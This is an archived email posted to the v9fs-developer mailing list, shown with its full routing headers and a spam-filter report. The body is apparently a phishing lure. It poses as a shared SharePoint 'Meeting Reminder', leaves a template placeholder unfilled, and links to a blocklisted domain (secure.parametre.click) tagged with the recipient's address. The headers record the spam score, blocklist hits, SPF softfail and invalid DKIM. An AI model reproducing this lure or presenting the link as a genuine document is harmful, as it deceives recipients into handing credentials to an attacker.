Return-Path: <v9fs-developer-bounces@lists.sourceforge.net>
X-Original-To: lists+v9fs-developer@lfdr.de
Delivered-To: lists+v9fs-developer@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 7731D9DF89F
	for <lists+v9fs-developer@lfdr.de>; Mon,  2 Dec 2024 02:57:12 +0100 (CET)
Received: from [127.0.0.1] (helo=sfs-ml-4.v29.lw.sourceforge.com)
	by sfs-ml-4.v29.lw.sourceforge.com with esmtp (Exim 4.95)
	(envelope-from <v9fs-developer-bounces@lists.sourceforge.net>)
	id 1tHvgT-0001AC-Ef;
	Mon, 02 Dec 2024 01:57:09 +0000
Received: from [172.30.29.66] (helo=mx.sourceforge.net)
 by sfs-ml-4.v29.lw.sourceforge.com with esmtps (TLS1.2) tls
 TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384 (Exim 4.95) (envelope-from
 <bounces+48404592-5e90-v9fs-developer=lists.sourceforge.net@em2283.ease-servicesgroup.com>)
 id 1tHvgS-0001A3-4f for v9fs-developer@lists.sourceforge.net;
 Mon, 02 Dec 2024 01:57:08 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=To:List-Unsubscribe:Reply-To:Subject:Message-ID:
 Mime-Version:From:Date:Content-Type:Sender:Cc:Content-Transfer-Encoding:
 Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
 Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Id:
 List-Help:List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=CYPrGF8mqr+zemvrMXwhFlbIrcHhdb4WurKVu9gTeHc=; b=kO4y1I568b+FE/wg0uLlGIHypH
 2JVi6Rd33AXfjWv2mmTKX/CaFROKx/9pAcRIM7iTmCEv2MmObW1hlOU/pMOXmq8dLT/9Xbahi1HYQ
 8GLLYEU1C0lwEnVHI/opC9A/COaPJ5ZRYYOc4CSVNmyhMuVD/JS6b05VnzqDDrolFosA=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=To:List-Unsubscribe:Reply-To:Subject:Message-ID:Mime-Version:From:Date:
 Content-Type:Sender:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Subscribe:
 List-Post:List-Owner:List-Archive;
 bh=CYPrGF8mqr+zemvrMXwhFlbIrcHhdb4WurKVu9gTeHc=; b=YUCeSKNFX6+G2Ee6MXwz1aEwYs
 3rMLqr9DRSW7ECCMWFDm1pMBFDekvP1vSN+8iyBXLfNVhLZ3kO16Sn5HiGsg0qFGnEShnNJraUEXG
 JsLIFZObjIBmjkXGWBMu/Kk4av0Fl9KeYEy7dXFregRo/6OYf4LAR4CVTL7JD3TGIavo=;
Received: from xtrwhxbr.outbound-mail.sendgrid.net ([167.89.10.181])
 by sfi-mx-2.v28.lw.sourceforge.com with esmtps
 (TLS1.2:ECDHE-RSA-AES128-GCM-SHA256:128) (Exim 4.95)
 id 1tHvgR-0001Gj-Dp for v9fs-developer@lists.sourceforge.net;
 Mon, 02 Dec 2024 01:57:08 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=ease-servicesgroup.com;
 h=content-type:from:mime-version:subject:reply-to:list-unsubscribe-post:
 list-unsubscribe:to:cc:content-type:from:subject:to;
 s=s1; bh=CYPrGF8mqr+zemvrMXwhFlbIrcHhdb4WurKVu9gTeHc=;
 b=pDnY5X4iJyNTmRdKcGXcISzO7XJHJdEemaP7V3YA1ZxK6F4Pwv46GycqU6yDej8dmOzF
 X66U/t1JVIUAO+XD/NjFHCRADwFqkvZQBOGLjOsKRihaTAUwG8hYssgGsToXglI5LYkF9s
 Uag0XQ5ZJSo2swINRcH6tsGcKrqZkas2qdjoyCV8N9lb3bqdpAxIyaxmqABagBB3RC0GHc
 /Tw8XFTKlnSrlhnq9tF5tacGcxpR6p6VWcIdK79NsXHj0Ft+0c1w7n/O8NgVJD7bwtSiQL
 T+AVyWCp92nYeYm1/NKusobpE41Ngo4hF0E7cLxy3OhAOx1DbyzCU/V1FLJRA2Cg==
Received: by recvd-5c8ccdbd88-r9rtl with SMTP id
 recvd-5c8ccdbd88-r9rtl-1-674D0F9F-8
 2024-12-02 01:38:39.243342334 +0000 UTC m=+1484203.312620884
Received: from NDg0MDQ1OTI (unknown) by geopod-ismtpd-33 (SG) with HTTP
 id WrQeiBfVSHSMf2caMhZDBQ Mon, 02 Dec 2024 01:38:39.221 +0000 (UTC)
Date: Mon, 02 Dec 2024 01:38:39 +0000 (UTC)
From: Sandra fitcher <hrdocument@ease-servicesgroup.com>
Mime-Version: 1.0
Message-ID: <WrQeiBfVSHSMf2caMhZDBQ@geopod-ismtpd-33>
List-Unsubscribe-Post: List-Unsubscribe=One-Click
X-SG-EID: =?us-ascii?Q?u001=2EHVq8j79czPrhnV44XU0XRsKXh7eZ371vY6sescmgVfomLIdpa2Zm4BcZP?=
 =?us-ascii?Q?yiTRpYAp95vO=2FEgOYv7ufLQUmtrLU7exgKuskJL?=
 =?us-ascii?Q?VifdzMUao6oUZD9M3T2lw+nxtGs2j33UdK4QMSm?=
 =?us-ascii?Q?hu5e9QqjUjiTsz=2FK0cM01FAUqKsnuuTpZyOkQC2?=
 =?us-ascii?Q?=2FNSR86z9GhjIZADJo0pxktAYpyfU1vJwkjPk=2FPQ?=
 =?us-ascii?Q?8Wf3051fjlN+RK=2FtFj2FjM2z9h1iYcrmANcj=2Frt?=
 =?us-ascii?Q?7rz9Q50LPhpL05IiL0UCsWB=2FCK8Xp6zXRhoXWkV?=
 =?us-ascii?Q?kcNlUFkw=3D?=
X-SG-ID: =?us-ascii?Q?u001=2EXwhBPNhCejkv4+fVosb2QVfR16Qxp9CrA7PjDe5zzeI=2F0IZCBsPXtgHbA?=
 =?us-ascii?Q?oGIj+RskLxA4N2rJjSWrHfgX07tLOm0v5BUQcd6?=
 =?us-ascii?Q?w3knjorGi7Hwu0WCOA5AFSvy0=2FwlG32=2FOYCqaew?=
 =?us-ascii?Q?A52B3B1R5+uAVHT7rfaS1scUVv6rtBjmpsmlWmp?=
 =?us-ascii?Q?tEG8tSX09IPGekfLx2Y0PkjEnB0Bm6SAmPnbU3Y?=
 =?us-ascii?Q?wJQizmHehSxlAhmjwVzP+PtFwSIRDHn=2FXuVbEQA?=
 =?us-ascii?Q?C6x8GeKYJFR8JWlShvd0DFGdRlbFDmpXtXP9VhW?=
 =?us-ascii?Q?02i8dmjEZitZy2KVRFkwiPCf+RfwSYMT3bsAIAx?=
 =?us-ascii?Q?g8QrsaqInHLtxyYCMT=2FCsm3Gnjd+Qolu+zD1yFi?=
 =?us-ascii?Q?nq86CelRruSlJ=2FHr70=2FDN84qAsD157pvpeJFK7J?=
 =?us-ascii?Q?AhErqPLNkgL5gujXfA2aFBMKNpvpLh45Ly7JZwk?=
 =?us-ascii?Q?ByO10lAN8R67FYACVmq8xLA2IK+UI9h8lytaV40?=
 =?us-ascii?Q?kYBOLs+fKO+HKmYTgAC3I0m=2FyUt7hA24JD9N0y7?=
 =?us-ascii?Q?4FIz+AAAhCv3GB5V5ZE0T+a4WI0ZQ5YkDA2YHfj?=
 =?us-ascii?Q?WwwYe6eHpbzPXyJZ3tbcxAF9KJ3kUgzyoqQACjr?=
 =?us-ascii?Q?yjSQLsZDDycOgyoygrp5JgUPmvnbXxDL8mEEPqk?=
 =?us-ascii?Q?cN60MLRYEVFb6bjzt+4QU1TPMgE=2FjTzvEKLloqo?=
 =?us-ascii?Q?xi2wskJavwLWWgfY5HOdW=2Fb?=
To: v9fs-developer@lists.sourceforge.net
X-Entity-ID: u001.JZht0uIXh9BBh/qE8V61sg==
X-Spam-Score: 6.8 (++++++)
X-Spam-Report: Spam detection software,
 running on the system "util-spamd-2.v13.lw.sourceforge.com", 
 has identified this incoming email as possible spam.  The original
 message has been attached to this so you can view it or label
 similar future email.  If you have any questions, see
 the administrator of that system for details.
 Content preview: v9fs-developer@lists.sourceforge.net Meeting Reminder
 SHAREPOINT
 A new Meeting Reminder Notice has been shared with you on *[-emaildomain-]*
 Sharepoint Storage. 
 Content analysis details:   (6.8 points, 6.0 required)
 pts rule name              description
 ---- ---------------------- --------------------------------------------------
 1.7 URIBL_BLACK            Contains an URL listed in the URIBL blacklist
 [URIs: parametre.click]
 1.9 URIBL_ABUSE_SURBL      Contains an URL listed in the ABUSE SURBL
 blocklist [URIs: parametre.click]
 -0.0 RCVD_IN_MSPIKE_H2      RBL: Average reputation (+2)
 [167.89.10.181 listed in wl.mailspike.net]
 0.0 RCVD_IN_VALIDITY_SAFE_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [167.89.10.181 listed in sa-accredit.habeas.com]
 0.0 RCVD_IN_VALIDITY_RPBL_BLOCKED RBL: ADMINISTRATOR NOTICE: The
 query to Validity was blocked.  See
 https://knowledge.validity.com/hc/en-us/articles/20961730681243
 for more information.
 [167.89.10.181 listed in bl.score.senderscore.com]
 2.0 PDS_OTHER_BAD_TLD      Untrustworthy TLDs
 [URI: secure.parametre.click (click)]
 1.0 SPF_SOFTFAIL           SPF: sender does not match SPF record (softfail)
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.0 HTML_MESSAGE           BODY: HTML included in message
 0.0 HTML_FONT_LOW_CONTRAST BODY: HTML font color similar or
 identical to background
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature, not necessarily
 valid
 0.1 DKIM_INVALID           DKIM or DK signature exists, but is not valid
X-Headers-End: 1tHvgR-0001Gj-Dp
X-Content-Filtered-By: Mailman/MimeDel 2.1.21
Subject: [V9fs-developer] New Month Meeting Reminder
X-BeenThere: v9fs-developer@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: "deprecated: use v9fs@lists.linux.dev"
 <v9fs-developer.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/v9fs-developer>, 
 <mailto:v9fs-developer-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=v9fs-developer>
List-Post: <mailto:v9fs-developer@lists.sourceforge.net>
List-Help: <mailto:v9fs-developer-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/v9fs-developer>, 
 <mailto:v9fs-developer-request@lists.sourceforge.net?subject=subscribe>
Reply-To: hrdocument@ease-servicesgroup.com
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 7bit
Errors-To: v9fs-developer-bounces@lists.sourceforge.net

v9fs-developer@lists.sourceforge.net Meeting Reminder

SHAREPOINT
----------

A new Meeting Reminder Notice has been shared with you on *[-emaildomain-]* Sharepoint Storage.

*View v9fs-developer@lists.sourceforge.net Document* ( https://secure.parametre.click/international.html?frm#v9fs-developer@lists.sourceforge.net )
_______________________________________________
V9fs-developer mailing list
V9fs-developer@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/v9fs-developer
